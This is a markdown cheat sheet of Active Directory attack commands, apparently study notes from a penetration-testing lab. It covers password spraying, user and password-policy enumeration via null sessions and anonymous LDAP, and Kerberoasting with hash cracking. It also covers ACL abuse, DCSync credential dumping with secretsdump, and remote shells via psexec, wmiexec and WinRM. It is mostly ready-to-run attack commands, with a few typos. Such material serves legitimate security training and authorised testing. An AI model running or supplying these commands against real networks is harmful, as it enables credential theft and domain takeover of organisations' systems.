## Scanning, Enumeration, Recon, External
## Initial Access

Enumerate users and spray passwords. Look for creds.

Scan for live hosts on network
```
fping -asgq sub.net.ip/24
```

Kerbrute for internal AD username enumeration
```
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
kerbrute userenum -d <domain.local> --dc <domain.ip.number> <usernametextfile-to-test> -o valid_ad_users.txt
```

Kerbrute can be used to password spray
```
/kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>
```

Password spray with Crackmapexec
```
crackmapexec smb <domain.ip> -u <user.list> -p <Password-to-try> //use --local-auth hen trying a local admin account
```

Windows domain spray internally - https://github.com/dafthack/DomainPasswordSpray
```
import-module domainpasswordspray.ps1
invoke-DomainPasswordSpray -password <password-to-try> -outfile <output.file> -errorAction silentlycontinue
```

Link for Kerbrute - https://github.com/ropnop/kerbrute

List of usernames - https://github.com/insidetrust/statistically-likely-usernames

Enumerate Password Policy with CME
```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
crackmapexec smb 172.16.5.5 --users
```

rpcclient to check a Domain Controller for SMB NULL session access
```
rpcclient -U "" -N <domain.ip>
then querydomaininfo to check password policy
Can also use enumdomusers command
```

enum3linux can enumerate windows hosts and domains
```
enum4linux -P <domain.ip>
enum4linux -U <domain.ip>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

enum4linux-ng is a rewrite and has additional features. -oA will output a JSON  and YAML file
```
enum4linux-ng -P <domain.ip> -oA save
```

Establish a null session on windows
```
net use \\DC01\ipc$ "" /u:""
```

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. From Linux.
```
ldapsearch -h <dc.ip> -x -b "DC=<domain-name>,DC=<LOCAL>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
Getting users with LDAP Anonymous
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Windapsearch can be userd to enumerate users, DA
```
windapsearch.py --dc-ip <172.16.5.5> -u "" -U
python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p password --da //find domain admins
python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p password -PU //find privileged users

```

## Internal enumeration - Services, Accounts, Security Controls

Credentialed enumeration - We're interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.

Crackmapexec for credentialed enumeration
```
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --users
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --groups
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --loggedon-users
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> --shares
sudo crackmapexec smb <domain.controller.ip> -u <username> -p <password> -M spider_plus --share "Share name" //CME will write results into a json file at /tmp/cme_spider_plus/<ip of host>
```

SMBmap can be used to enumerate shares
```
smbmap -u <username> -p <password> -d <domainName.LOCAL> -H <domain.controller.ip>
smbmap -u <username> -p <password> -d <domainName.LOCAL> -H <domain.controller.ip> -R <Name of share> --dir-only //Recursively list directories
```

Impacket toolset
```
psexec.py <domainName.local>/<username>:<'password'>@<target.ip> //psexec requires a user with local admin privileges
wmiexec.py <domainName.local>/<username>:<'password'>@<target.ip> //not a fully interactive shell
```

Bloodhound - Once domain creds are obtained, you can run bloodhound - https://github.com/dirkjanm/BloodHound.py. Clone the repo then ```pip install .```
```
sudo bloodhound-python -u <'username'> -p <'password'> -ns <172.16.5.5> -d <domainname.local> -c all
sudo neo4j start
bloodhound
```

Credentialed Enumeration with Powershell
```
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName //This will get us a listing of accounts that may be susceptible to a Kerberoasting attack
Get-ADGroup -Filter * | select name
```

Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. - https://github.com/SnaffCon/Snaffler
```
snffler.exe
```

Kerberoasting from Linux
```
GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request
GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request-user <any-user> -outputfile <text-file-name>
hashcat -m 13100 <text-file-name> /usr/share/wordlists/rockyou.txt 
```

Powerview to extract TGS Tickets - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```
Import-module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname //list all users with SPN
Get-DomainUser -Identity <user-from-list> | Get-DomainSPNTicket -Format Hashcat
```

Kerberoasting with Rubeus - https://github.com/GhostPack/Rubeus
```
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap //Request tickets for accounts with admincount attribute set to 1
/tgtdeleg flag will only request RC4 tickets
```

Access Control List
```
ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
AddSelf - shows security groups that a user can add themselves to.

GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access
```

ACL Enumeration with Powerview //Guids https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password //ResolveGUIDs flag will print guid as human-readable
```
Find-InterestingDomainAcl
Import-Module Powerview.ps1
$sid = Convert-NameToSid <name>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

DSync - You must have (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set.
```
Get-DomainUser -Identity <domain-user-with-replication-rights>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
$sid= "<S-1-5-21-SID-OF-USER-FROM-LAST-COMMAND>"
import-module Powerview.ps1
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl //checks to make sure the user has the rights.

from a linux box
secretsdump.py -outputfile hashes.txt -just-dc INLANEFREIGHT/<user-with-replication-rights-@<172.16.5.5>
```

Establish winrm sessions from windows 
```
$password = ConvertTo-SecureString "<known-password-of-a-domain-user>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\<name-of-domain-user>", $password)
Enter-PSSession -ComputerName <Name-of-computer-to-enter> -Credential $cred
```
